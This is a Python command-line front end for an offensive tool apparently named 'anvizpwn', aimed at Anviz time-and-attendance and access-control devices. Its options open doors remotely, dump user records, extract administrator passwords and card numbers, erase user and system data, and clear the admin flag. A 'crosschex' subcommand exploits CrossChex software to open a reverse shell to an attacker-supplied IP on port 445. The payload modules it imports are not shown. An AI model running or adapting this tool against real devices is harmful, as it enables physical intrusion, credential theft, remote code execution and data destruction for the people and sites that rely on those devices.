#!/usr/bin/env python
#
# # -*- coding: utf-8 -*-
import logging
import argparse
import TC_B
import ResponseParser
import sys

# TODO FEATURES
# Open Door
# Get Configs
# Dump Users
# Add Users

# Program start
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Interact with anviz T&A devices'
                                                 'Use this tool to extract database and open doors'
                                                 '@Authors: Luis Catarino (AdamantSec)/ Pedro Rodrigues')

    subparser = parser.add_subparsers(title='Valid commands', description='Use "python3 anvizpwn.py {net|shell}, -h" for more information', help='help')
    
    parser_network = subparser.add_parser('net', help='the \'net\' command takes one argument (IP) and an option')

    parser_network.add_argument('ip', metavar='IP', type=str, nargs=1,
                        help='IP Address of the endpoint')

    parser_network.add_argument('--port', dest='port',
                        type=int, default=5010, nargs='?',
                        help='Management Port of the device')

    parser_network.add_argument('--channel', dest='CH',
                        type=str, default=b"\x00\x00\x00\x00", nargs='?',
                        help='Channel or Device Identification')

    parser_network.add_argument('--timeout', dest='timeout',
                        type=int, default=5, nargs='?',
                        help='Time out value')

    parser_network.add_argument('--config', dest='config', action='store_true',
                        default=False,
                        help='Get config')

    parser_network.add_argument('--opendoor', dest='opendoor', action='store_true',
                        default=False,
                        help='Open door')

    parser_network.add_argument('--date', dest='date', action='store_true',
                        default=False,
                        help='Get Date from the device')

    parser_network.add_argument('--network', dest='network', action='store_true',
                        default=False,
                        help='Get Network Information from the device')

    parser_network.add_argument('--userrecords', dest='userrecords', action='store_true',
                        default=False,
                        help='Get User records stored on the device')

    parser_network.add_argument('--useramount', dest='useramount', action='store_true',
                        default=False,
                        help='Get just amount of user records stored on the device')

    parser_network.add_argument('--factoryinfocode', dest='factoryinfocode', action='store_true',
                        default=False,
                        help='Get Factory information code')

    parser_network.add_argument('--inituserdata', dest='inituserdata', action='store_true',
                        default=False,
                        help='WARNING! This WILL ERASE data. Initialize users data')

    parser_network.add_argument('--initsystem', dest='initsystem', action='store_true',
                        default=False,
                        help='WARNING! This WILL ERASE data. Initialize system')

    parser_network.add_argument('--schedulebell', dest='schedualebell', action='store_true',
                        default=False,
                        help='Get Schedule bell data from device')

    parser_network.add_argument('--messageheaders', dest='messageheaders', action='store_true',
                        default=False,
                        help='Get Headers of messages stored in the device')

    parser_network.add_argument('--statemessage', dest='statemessage', action='store_true',
                        default=False,
                        help='Get state message data from device')

    parser_network.add_argument('--devicecapacity', dest='devicecapacity', action='store_true',
                        default=False,
                        help='Get device capacity from device')

    parser_network.add_argument('--commid', dest='commid', action='store_true',
                        default=False,
                        help='Get comunication ID of the device')

    parser_network.add_argument('--clearadmin', dest='clearadmin', action='store_true',
                        default=False,
                        help='Clear administrator flag for the device. May impact on the manageability of the device')

    parser_network.add_argument('--random', dest='random', action='store_true',
                        default=False,
                        help='Get random number from the device')

    parser_network.add_argument('--serialnumber', dest='serialnumber', action='store_true',
                        default=False,
                        help='Get serial number from the device')

    parser_network.add_argument('--specialstate', dest='specialstate', action='store_true',
                        default=False,
                        help='Get special state data from device')

    parser_network.add_argument('--photoamount', dest='photoamount', action='store_true',
                        default=False,
                        help='Get amount of photos stored in the device')

    parser_network.add_argument('--admincredentials', dest='admincredentials', action='store_true',
                        default=False,
                        help='Get administrator credentials (password/card number) from the device')

    parser_network.add_argument('--daylight', dest='daylight', action='store_true',
                        default=False,
                        help='Get daylight settings from the device')

    parser_network.add_argument('--languages', dest='languages', action='store_true',
                        default=False,
                        help='Get languages available on the device')

    parser_network.add_argument('--gprs', dest='gprs', action='store_true',
                        default=False,
                        help='Get GPRS settings from the device')

    parser_network.add_argument('--deviceextended', dest='deviceextended', action='store_true',
                        default=False,
                        help='Get device extended information')

    parser_network.add_argument('--cardinfo', dest='cardinfo', action='store_true',
                        default=False,
                        help='Get punchcard info from T5S devices')

    parser_network.add_argument('--dos', dest='dos', action='store_true',
                        default=False,
                        help='Cause a denial of service (Not implemented yet)')

    parser_network.add_argument('--devices', dest='devices', action='store_true',
                        default=False,
                        help='Search for devices in the network')

    parser_crosschex = subparser.add_parser('crosschex', help='has to be on the same broadcast domain. crosschex takes an argument --interface {network interface}, and an optional --dst-ip {IP to receive the reverse shell on port 445},. e.g: python3 anvizpwn.py crosschex --int eth0 --dst-ip 10.10.2.55')
    
    parser_crosschex.add_argument('--dst-ip', metavar='IP', type=str, nargs="?", default="", help='IP for the LHOST (if not passed a calculator will be dropped)')
    parser_crosschex.add_argument('--interface', metavar='INT', type=str, nargs=1, help='Interface of the network broadcast')

    args = parser.parse_args()

    if (len(vars(args)) == 0):
        parser.print_help()
        sys.exit()

    net = True
    try:
        ip = args.ip
    except:
        net = False

    # 'net' command options
    if (net):
        # Started selecting arguments 
        if (args.config):
            res = TC_B.getConfig(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.opendoor):
            res = TC_B.openDoor(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.date):
            res = TC_B.getDateOfDevice(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.network):
            res = TC_B.getNetwork(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.userrecords):
            res = TC_B.getUserRecords(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.useramount):
            res = TC_B.getUserRecordsAmount(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.factoryinfocode):
            res = TC_B.getFactoryInfoCode(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.inituserdata):
            res = TC_B.initUserArea(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.initsystem):
            res = TC_B.initSystem(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.schedualebell):
            res = TC_B.getSchedualeBell(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.messageheaders):
            res = TC_B.getHeadersOfMessages(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.statemessage):
            res = TC_B.getTAStateMessage(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.devicecapacity):
            res = TC_B.getDeviceCapacity(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.commid):
            res = TC_B.getCOMMID(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.clearadmin):
            res = TC_B.clearAdminFlag(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.random):
            res = TC_B.getRandomNumber(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.serialnumber):
            res = TC_B.getSerialNumber(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.specialstate):
            res = TC_B.getSpecialState(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)
        if (args.photoamount):
            res = TC_B.getPhotoAmount(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.admincredentials):
            res = TC_B.getAdminOrCardCredentials(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.daylight):
            res = TC_B.getDaylight(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.languages):
            res = TC_B.getLanguages(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.gprs):
            res = TC_B.getGPRSSettings(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.deviceextended):
            res = TC_B.getDeviceExtendedInformation(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.cardinfo):
            res = TC_B.getCardInfo(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.dos):
            res = TC_B.getCardInfo(args.ip[0], port=args.port, CH=args.CH)
            ResponseParser.parseSuccess(res)

        if (args.devices):
            res = TC_B.getDevices(args.ip[0], timeout=args.timeout)
            # ResponseParser.parseSuccess(device)
    else:
        # crosschex options
        if (args.interface):
            # print("Running crosschex with ip %s and int %s" % (args.dst_ip, args.interface))
            res = TC_B.exploitCrossChex(args.dst_ip, args.interface)